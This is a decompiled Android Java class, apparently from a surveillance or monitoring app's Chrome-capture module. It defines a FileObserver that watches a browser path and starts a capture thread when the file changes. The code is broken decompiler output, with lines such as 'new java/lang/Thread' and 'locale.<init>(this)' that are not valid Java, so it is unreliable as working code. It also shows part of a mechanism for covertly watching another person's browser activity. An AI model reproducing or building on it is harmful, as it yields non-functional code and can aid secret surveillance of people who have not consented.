package com.vvt.capture.chrome.a;

import android.os.FileObserver;
import java.io.File;

class d
  extends FileObserver
{
  private Thread b = null;
  private String c;
  private File d;
  
  public d(c paramc, String paramString)
  {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = c.c();
      if (bool) {}
      localThread = new java/lang/Thread;
      e locale = new com/vvt/capture/chrome/a/e;
      locale.<init>(this);
      localThread.<init>(locale);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */